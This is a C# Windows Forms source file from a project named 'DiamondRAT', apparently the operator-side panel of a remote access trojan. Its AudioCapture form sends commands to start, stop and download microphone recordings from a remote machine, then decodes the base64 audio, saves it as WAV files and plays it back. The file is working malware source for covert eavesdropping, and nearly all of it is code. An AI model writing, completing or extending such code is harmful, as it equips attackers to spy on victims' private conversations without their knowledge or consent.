using DiamondRAT.Properties;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.Devices;
using System;
using System.ComponentModel;
using System.IO;
using System.Threading;
using System.Windows.Forms;

namespace DiamondRAT
{
    class AudioCapture : MyForm
    {
        private IContainer components;

        private PictureBox PictureBox1;
        private Button btn_startrecording;
        private Button btn_stoprecording;
        private Button Button1;
        private Label Label1;
        private Label Label2;
        private PictureBox PictureBox2;

        public AudioCapture()
        {
            InitializeComponent();

            this.FormType = FormType.AudioCapture;
        }

        protected override void Dispose(bool disposing)
        {
            try
            {
                if (disposing && components != null)
                {
                    components.Dispose();
                }
            }
            finally
            {
                base.Dispose(disposing);
            }
        }

        private void InitializeComponent()
        {
            this.components = new System.ComponentModel.Container();
            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(AudioCapture));
            this.btn_startrecording = new System.Windows.Forms.Button();
            this.btn_stoprecording = new System.Windows.Forms.Button();
            this.Button1 = new System.Windows.Forms.Button();
            this.Label1 = new System.Windows.Forms.Label();
            this.Label2 = new System.Windows.Forms.Label();
            this.PictureBox2 = new System.Windows.Forms.PictureBox();
            this.PictureBox1 = new System.Windows.Forms.PictureBox();
            ((System.ComponentModel.ISupportInitialize)(this.PictureBox2)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.PictureBox1)).BeginInit();
            this.SuspendLayout();
            // 
            // btn_startrecording
            // 
            this.btn_startrecording.Font = new System.Drawing.Font("Microsoft Sans Serif", 9F);
            this.btn_startrecording.Location = new System.Drawing.Point(211, 12);
            this.btn_startrecording.Name = "btn_startrecording";
            this.btn_startrecording.Size = new System.Drawing.Size(132, 29);
            this.btn_startrecording.TabIndex = 1;
            this.btn_startrecording.Text = "Start Recording";
            this.btn_startrecording.UseVisualStyleBackColor = true;
            this.btn_startrecording.Click += new System.EventHandler(this.btn_startrecording_Click);
            // 
            // btn_stoprecording
            // 
            this.btn_stoprecording.Font = new System.Drawing.Font("Microsoft Sans Serif", 9F);
            this.btn_stoprecording.Location = new System.Drawing.Point(211, 47);
            this.btn_stoprecording.Name = "btn_stoprecording";
            this.btn_stoprecording.Size = new System.Drawing.Size(132, 29);
            this.btn_stoprecording.TabIndex = 2;
            this.btn_stoprecording.Text = "Stop Recording";
            this.btn_stoprecording.UseVisualStyleBackColor = true;
            this.btn_stoprecording.Click += new System.EventHandler(this.btn_stoprecording_Click);
            // 
            // Button1
            // 
            this.Button1.Font = new System.Drawing.Font("Microsoft Sans Serif", 9F);
            this.Button1.Location = new System.Drawing.Point(211, 82);
            this.Button1.Name = "Button1";
            this.Button1.Size = new System.Drawing.Size(132, 29);
            this.Button1.TabIndex = 3;
            this.Button1.Text = "Download Audio";
            this.Button1.UseVisualStyleBackColor = true;
            this.Button1.Click += new System.EventHandler(this.Button1_Click);
            // 
            // Label1
            // 
            this.Label1.AutoSize = true;
            this.Label1.Location = new System.Drawing.Point(179, 116);
            this.Label1.Name = "Label1";
            this.Label1.Size = new System.Drawing.Size(190, 26);
            this.Label1.TabIndex = 4;
            this.Label1.Text = "The recorded audio will be played and \r\nsaved automatically after download!";
            // 
            // Label2
            // 
            this.Label2.AutoSize = true;
            this.Label2.Location = new System.Drawing.Point(306, 177);
            this.Label2.Name = "Label2";
            this.Label2.Size = new System.Drawing.Size(33, 13);
            this.Label2.TabIndex = 5;
            this.Label2.Text = "Idle...";
            // 
            // PictureBox2
            // 
            this.PictureBox2.Image = ((System.Drawing.Image)(resources.GetObject("PictureBox2.Image")));
            this.PictureBox2.Location = new System.Drawing.Point(284, 176);
            this.PictureBox2.Name = "PictureBox2";
            this.PictureBox2.Size = new System.Drawing.Size(16, 16);
            this.PictureBox2.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
            this.PictureBox2.TabIndex = 6;
            this.PictureBox2.TabStop = false;
            // 
            // PictureBox1
            // 
            this.PictureBox1.Image = ((System.Drawing.Image)(resources.GetObject("PictureBox1.Image")));
            this.PictureBox1.Location = new System.Drawing.Point(-41, 12);
            this.PictureBox1.Name = "PictureBox1";
            this.PictureBox1.Size = new System.Drawing.Size(210, 178);
            this.PictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
            this.PictureBox1.TabIndex = 0;
            this.PictureBox1.TabStop = false;
            // 
            // AudioCapture
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.BackColor = System.Drawing.Color.White;
            this.ClientSize = new System.Drawing.Size(388, 201);
            this.Controls.Add(this.PictureBox2);
            this.Controls.Add(this.Label2);
            this.Controls.Add(this.Label1);
            this.Controls.Add(this.Button1);
            this.Controls.Add(this.btn_stoprecording);
            this.Controls.Add(this.btn_startrecording);
            this.Controls.Add(this.PictureBox1);
            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.FixedSingle;
            this.Icon = ((System.Drawing.Icon)(resources.GetObject("$this.Icon")));
            this.MaximizeBox = false;
            this.Name = "AudioCapture";
            this.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
            this.Text = "Audio";
            this.Load += new System.EventHandler(this.AudioCapture_Load);
            ((System.ComponentModel.ISupportInitialize)(this.PictureBox2)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.PictureBox1)).EndInit();
            this.ResumeLayout(false);
            this.PerformLayout();

        }

        private int _number = 0;

        public override void ProcessMsg(string msg)
        {
            PlayandSaveAudio(msg.Replace("RecordingFile", ""));
        }

        private void PlayandSaveAudio(string txt)
        {
            string text = txt.Split('|')[0];
            txt = txt.Replace(txt.Split('|')[0] + "|", "");
            byte[] bytes = Convert.FromBase64String(txt);
            if (!File.Exists(Application.StartupPath + "\\Audio_Files\\"))
            {
                Directory.CreateDirectory(Application.StartupPath + "\\Audio_Files\\");
            }
            File.WriteAllBytes(Application.StartupPath + "\\Audio_Files\\" + text + "_" + _number.ToString() + ".wav", bytes);
            Label2.Text = "Playing...";
            PictureBox2.Image = Resources.play;
            (new Audio()).Play(Application.StartupPath + "\\Audio_Files\\" + text + "_" + _number.ToString() + ".wav", AudioPlayMode.Background);

            _number++;
        }

        private void AudioCapture_Load(object sender, EventArgs e)
        {
            PictureBox2.Image = Resources.greenball;
            Label2.Text = "Recording...";
        }

        private void btn_startrecording_Click(object sender, EventArgs e)
        {
            Connection.Send("RecordingStart");
            PictureBox2.Image = Resources.greenball;
            Label2.Text = "Recording...";
        }

        private void btn_stoprecording_Click(object sender, EventArgs e)
        {
            Connection.Send("RecordingStop");
            PictureBox2.Image = Resources.redball;
            Label2.Text = "Idle...";
        }

        private void Button1_Click(object sender, EventArgs e)
        {
            if (String.Compare(Label2.Text, "Idle...", false) != 0)
            {
                Connection.Send("RecordingStop");
                Thread.Sleep(1000);
                Connection.Send("RecordingDownload");
                PictureBox2.Image = Resources.arrow_270;
                Label2.Text = "Downloading...";
            }
            else
            {
                Connection.Send("RecordingDownload");
                PictureBox2.Image = Resources.arrow_270;
                Label2.Text = "Downloading...";
            }
        }
    }
}